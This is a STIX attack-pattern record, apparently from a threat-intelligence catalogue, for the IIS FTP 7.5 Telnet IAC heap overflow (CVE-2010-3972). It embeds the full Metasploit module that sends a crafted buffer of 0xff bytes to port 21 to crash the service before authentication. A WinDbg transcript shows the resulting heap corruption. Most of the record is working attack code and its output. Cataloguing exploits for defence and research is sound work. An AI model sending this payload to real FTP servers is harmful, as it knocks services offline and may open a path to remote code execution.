{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aa768deb-57cd-463f-8ed1-25bfee91c3f4",
    "created": "2024-08-14T16:25:24.077803Z",
    "modified": "2024-08-14T16:25:24.077807Z",
    "name": "Microsoft IIS FTP Server Encoded Response Overflow Trigger",
    "description": " This module triggers a heap overflow when processing a specially crafted FTP request containing Telnet IAC (0xff) bytes. When constructing the response the Microsoft IIS FTP Service overflows the heap buffer with 0xff bytes.  This issue can be triggered pre-auth and may in fact be exploitable for remote code execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof.rb",
            "external_id": "iis75_ftpd_iac_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3972"
        },
        {
            "source_name": "reference",
            "url": "https://msrc-blog.microsoft.com/2010/12/22/assessing-an-iis-ftp-7-5-unauthenticated-denial-of-service-vulnerability/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft IIS FTP Server Encoded Response Overflow Trigger',\n      'Description'    => %q{\n          This module triggers a heap overflow when processing a specially crafted\n        FTP request containing Telnet IAC (0xff) bytes. When constructing the response,\n        the Microsoft IIS FTP Service overflows the heap buffer with 0xff bytes.\n\n        This issue can be triggered pre-auth and may in fact be exploitable for\n        remote code execution.\n      },\n      'Author'         =>\n        [\n          'Matthew Bergin',  # Original discovery/disclosure\n          'jduck'            # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-3972' ],\n          [ 'OSVDB', '70167' ],\n          [ 'BID', '45542' ],\n          [ 'MSB', 'MS11-004' ],\n          [ 'EDB', '15803' ],\n          [ 'URL', 'https://msrc-blog.microsoft.com/2010/12/22/assessing-an-iis-ftp-7-5-unauthenticated-denial-of-service-vulnerability/' ]\n        ],\n      'DisclosureDate' => '2010-12-21'))\n\n    register_options(\n      [\n        Opt::RPORT(21)\n      ])\n  end\n\n\n  def run\n    connect\n\n    banner = sock.get_once(-1, 10)\n    print_status(\"banner: #{banner.to_s.strip}\")\n\n    buf = Rex::Text.pattern_create(1024)\n\n    # the 0xff's must be doubled, the server will un-and-re-double them.\n    ffs = \"\\xff\" * (0x7e*2)\n\n    # Continuing after the first exception sometimes leads to this being derefenced.\n    buf[0,3] = [0xdeadbe00].pack('V')[1,3]\n\n    buf[4,ffs.length] = ffs\n    buf << \"\\r\\n\"\n\n    sock.put(buf)\n\n    disconnect\n  rescue ::Rex::ConnectionError\n  end\nend\n\n=begin\n\nThis transcript is from a vulnerable Win7 machine:\n\nProcessing initial command '$<script.wdbg'\n0:012> $<script.wdbg\n0:012> bp ftpsvc+3f360 \".printf \\\"buf @ 0x%x, len: 0x%x (end: 0x%x)\\\\n\\\", eax, ecx, (eax+ecx);g\"\n0:012> bp ftpsvc+3f382 \".printf \\\"extra len: 0x%x\\\\n\\\", edi;g\"\n0:012> bp ftpsvc+3f395 \".printf \\\"(0x%x+0x%x) 0x%x > (0x%x-0x%x) 0x%x ??\\\\n\\\", ecx, edi, ebx, poi(esi+14), poi(esi+8), edx;g\"\n0:012> bp ftpsvc+3f397\n0:012> bp ftpsvc+3f39f \"r @$t0 = ecx;g\"\n0:012> bp ftpsvc+3f3a4 \".printf \\\"allocated 0x%x bytes at 0x%x (end: 0x%x)\\\\n\\\", @$t0, eax, (eax+@$t0);g\"\n0:012> *bp ftpsvc+3f3c0 \".printf \\\"writing 0xff to 0x%x\\\\n\\\", eax;g\"\n0:012> *bp ftpsvc+3f3c6 \".printf \\\"writing 0x%x to 0x%x\\\\n\\\", (edx & 0xff), eax;g\"\n0:012> g\nbuf @ 0x97f81c, len: 0x1b (end: 0x97f837)\nextra len: 0x0\nbuf @ 0x3e4ca0, len: 0x3a4 (end: 0x3e5044)\nextra len: 0x7e\n(0x3a4+0x7e) 0x422 > (0x422-0x0) 0x422 ??\nBreakpoint 3 hit\neax=003e4ca0 ebx=00000422 ecx=000003a4 edx=00000422 esi=00dcfaf8 edi=0000007e\neip=6c63f397 esp=00dcfaac ebp=00dcfac0 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nftpsvc!TELNET_STREAM_CONTEXT::OnSendData+0x49:\n6c63f397 8b7df8          mov     edi,dword ptr [ebp-8] ss:0023:00dcfab8=00000000\n0:007> g\n(2f8.a40): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=003e50d0 ebx=00000000 ecx=ffffffff edx=003e4898 esi=003e4890 edi=002f0000\neip=778f30d7 esp=00dcf990 ebp=00dcfa70 iopl=0         nv up ei ng nz ac pe cy\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010297\nntdll!RtlpFreeHeap+0x4d6:\n778f30d7 8b19            mov     ebx,dword ptr [ecx]  ds:0023:ffffffff=????????\n0:007> g\n(2f8.a40): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=003e4898 ebx=003e4c98 ecx=deadbe27 edx=ffffff41 esi=003e4890 edi=002f0000\neip=778f6030 esp=00dcf950 ebp=00dcf978 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nntdll!RtlpCoalesceFreeBlocks+0x268:\n778f6030 8b4904          mov     ecx,dword ptr [ecx+4] ds:0023:deadbe2b=????????\n\n=end\n",
    "x_mitre_disclosure_date": "2010-12-21"
}